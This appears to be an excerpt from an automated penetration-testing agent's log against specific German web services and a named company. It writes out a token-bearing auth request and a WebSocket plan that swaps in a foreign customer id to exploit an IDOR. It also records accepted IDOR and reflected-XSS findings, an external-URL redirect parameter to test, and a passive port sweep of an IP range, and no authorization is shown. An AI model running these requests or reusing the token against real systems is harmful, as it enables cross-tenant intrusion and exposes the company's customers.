+[NEXT] HUMAN: operator two-tenant WS pairwise test — `GET https://www.applicationdesigner.de/extjs/livedebugger/auth.php?token=3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3&customer_id={own}&srn=100` mint own-cid token, then WS-upgrade `wss://cbs-proxy.api.live-manager.de/?origin=LiveDebugger&cid={own}&service=100&token={minted}` vs `&cid={foreign}` and diff accepted frame byte-streams (hold 15s; NO live_debug payloads). Anonymous variant exhausted: three-context byte-identity (d5d3e6b5…) + silent after READY. Fold in standing items: render help/content.php XSS; POST-auth www.live-manager.de `rs=base64(external URL)`; passive TCP-connect 185.158.96.0/22 (ESL 8021/SIP 5060|5061/Rayo 5222).
+
+STEP 6 — LEARNING
+- [LEARN] ACCEPTED IDOR @ cbs-proxy.api.live-manager.de: three-context upgrades (minted-token+real cid / zero-token+real cid / zero-token+nonexistent cid 999999999) → byte-identical 4-frame text stream (396B, sha d5d3e6b5…) — connection layer is cid/token agnostic; transport-complete, freshly tooling-corrected.
+- [LEARN] ACCEPTED IDOR @ www.applicationdesigner.de/extjs/livedebugger/auth.php: mint regression day-3, distinct per-cid tokens, no-token → Not logged in.
+- [LEARN] CORRECTION @ /help.js: live bundle b56a5f1e… unchanged since 09-17; recorded "55f7d9e9" was the /extjs/help.js 404-body hash — no rebuild, no new endpoints, credential unrotated; anonymous surface still zero beyond prior map.
+- [LEARN] REJECTED @ get_agent_costs.php / get_agent_token.php: gate text now byte-identical "Zugriff verweigert." (49B, 3b0256f7) — still session-gated; no surface change.
+- [LEARN] ACCEPTED XSS @ /help/content.php: page= reflection re-echoed (sha dafda395…, 90B, no CSP/nosniff) — execution operator-pending.
+
+STEP 7 — RISK
+[RISK] questnet-gmbh: 82 — auth.php mint regression un-mitigated on day 3 fully re-arms the chain (anonymous per-cid live-debug token → cbs-proxy misbind); fresh three-context byte-identical WS stream including nonexistent cid 999999999 proves connection-layer cid/token agnosticism and sustains driver 8.6 (9.1 gated only by operator two-tenant backend-binding test). Report set: auth.php mint 7.5 REGRESSED un-mitigated, help.js credential 7.5, voicenote PII 7.5 (UUID-blocked), get_user_rights 6.5 ciphertext, driver BOLA HOLD 8.6, XSS HUMAN_ONLY MED/HIGH chained. No new anonymous lever opened this cycle — everything else byte-stable or denial-gated; risk flat-to-slightly-up from 80.
